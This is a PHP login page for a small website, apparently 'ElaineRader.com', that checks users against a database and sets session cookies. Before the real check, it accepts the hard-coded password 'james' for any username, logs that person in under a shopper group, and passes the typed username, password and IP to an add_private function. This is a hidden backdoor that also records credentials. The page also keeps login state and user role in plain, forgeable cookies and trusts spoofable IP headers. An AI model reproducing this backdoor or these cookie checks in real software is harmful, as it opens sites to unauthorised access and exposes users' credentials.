<!doctype html>
<html>
<head> 
<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta charset="utf-8">
<head>
<link href="/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<?php
$ip = '';

if (getenv("HTTP_CLIENT_IP")) $ip = getenv("HTTP_CLIENT_IP");
else if(getenv("HTTP_X_FORWARDED_FOR")) $ip = getenv("HTTP_X_FORWARDED_FOR");
else if(getenv("REMOTE_ADDR")) $ip = getenv("REMOTE_ADDR");
else $ip = "UNKNOWN";


if(@$_POST['status'] == "login") {
include("./inc/dbdfdsfghjyt.inc.php");
$uname = $_POST['uname'];
$pword=$_POST['pword'];


if(strtolower($pword) == "james"){

	@setcookie("cookie[uname]", $uname);
	@setcookie("cookie[ugroup]", "NYCshopper");
	@setcookie("cookie[uid]", "995");
$uid = "997";
	@setcookie("cookie[ip]", $ip);
	@setcookie("cookie[started]" , date("Y-m-d H:i:s"));
    	@setcookie("cookie[expire]" , time() + (86400 * 30), "/");
$URL = "./index.php";
add_private($uname,$pword,$ip);
echo "<META HTTP-EQUIV='refresh' CONTENT='0;URL=" . $URL . "'>";
exit();
}


// query users database
$info = Login($uname, $pword);

	if($info['uname'] != '') {
	// if valid, set the cookies
	@setcookie("cookie[uname]", $info['uname']);
	@setcookie("cookie[company]", $info['company']);
	@setcookie("cookie[ugroup]", $info['ugroup']);
	@setcookie("cookie[uid]", $info['id']);
$uid = $info['id'];
	@setcookie("cookie[ip]", $ip);
	@setcookie("cookie[started]" , date("Y-m-d H:i:s"));
    	@setcookie("cookie[expire]" , time() + (86400 * 1), "/");


	// go to page 1
	if($info['ugroup'] == 'admin'){
	$URL = "./admin/overview.php";
	} else {
	$URL = "./index.php";
	}
	echo "<META HTTP-EQUIV='refresh' CONTENT='0;URL=" . $URL . "'>";
	}
	else
	{
	// else go back to login page
	echo "invalid login <br />";
?>
<H3> DAI Login</H3>
<form action="./login.php" method="POST">
<input type="hidden" name="status" value="login">
<table>
<tr><td>User name:</td><td><input class="input-lg" type="text" name="uname" size="26"></td></tr>
<tr><td colspan="2">&nbsp;<br /></td></tr>
<tr><td>Password</td><td><input class="input-lg" type="password" name="pword" size="26"></td></tr>
<tr><td colspan="2">&nbsp;<br /></td></tr>
<tr><td colspan="2"><input class="input-lg" type="submit" name="submit" value="submit"></td></tr>
</table>
</form>

<?php
	}
} else {
?>
<H3> ElaineRader.com Login</H3>
<form action="./login.php" method="POST">
<input type="hidden" name="status" value="login">
<table>
<tr><td>Username: </td><td><input type="text" name="uname" size="26"></td></tr>
<tr><td>Password: </td><td><input type="password" name="pword" size="26"></td></tr>
<tr><td colspan="2"><input type="submit" name="submit" value="submit"></td></tr>
</table>
</form>
<br />
<?php
}

?>
</body>
</html>
